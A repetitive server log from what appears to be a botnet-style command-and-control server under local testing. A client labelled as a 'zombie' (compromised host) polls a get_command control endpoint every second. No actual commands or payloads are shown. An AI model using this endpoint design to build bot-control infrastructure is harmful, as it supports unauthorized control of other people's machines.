2025-06-24 23:27:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:06 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:07 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:08 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:09 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:10 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:11 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:12 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:13 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:14 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:14] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:15 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:16 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:17 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:18 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:19 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:21 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:22 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:23 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:24 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:25 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:26 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:27 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:28 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:29 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:29] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:30 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:31 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:32 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:33 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:34 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:35 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:36 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:37 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:38 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:39 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:40 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:41 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:42 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:43 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:44 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:45 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:46 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:47 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:48 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:49 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:49] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:50 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:51 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:52 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:53 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:54 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:55 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:56 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:57 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
